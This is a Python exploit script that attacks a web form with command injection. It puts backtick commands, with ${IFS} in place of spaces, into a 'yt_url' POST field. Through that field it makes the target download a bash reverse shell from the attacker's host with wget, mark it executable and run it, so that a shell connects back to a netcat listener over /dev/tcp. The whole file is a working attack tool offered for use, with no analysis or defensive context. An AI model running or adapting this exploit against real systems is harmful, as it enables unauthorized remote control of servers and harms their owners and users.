import requests, argparse
from sys import exit
from termcolor import cprint

parser = argparse.ArgumentParser()
parser.add_argument("-url", help="Target URL", required=True)
parser.add_argument("-lhost", help="Local IP", required=True)
parser.add_argument("-lport", help="Local Port", required=True)
args = parser.parse_args()

target = args.url
lhost = args.lhost
lport = args.lport

headers = {
'X-Requested-With': 'XMLHttpRequest'
}

with open("./shell.sh", "w") as fp:
    fp.write(f"""#!/bin/bash
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1""")

while True:
    http_running = input("[~] You need a http server running in this current directory. Command: python3 -m http.server 80\nIs it running? (Y/n) ").lower()
    nc_running = input(f"[~] You need to have netcat running. Command: netcat -lvnp {lport}\nIs this running? (Y/n) ").lower()
    if http_running == 'n' or nc_running == 'n':
        cprint("[-] You need to have netcat and a http server running in the current directory to proceed with the exploit.", "red")
    else:
        break

cprint(f"[+] Starting attack against {target}", "green")
requests.post(target, data={'yt_url': '`wget${IFS}'+lhost+'/shell.sh`'}, headers=headers)
cprint("[+] Uploading reverse shell...", "green")
requests.post(target, data={'yt_url': '`chmod${IFS}+x${IFS}shell.sh`'}, headers=headers)
cprint("[+] Making it executable...", "green")
cprint("[+] Trying to execute...", "green")
requests.post(target, data={'yt_url': '`bash${IFS}shell.sh`'}, headers=headers)
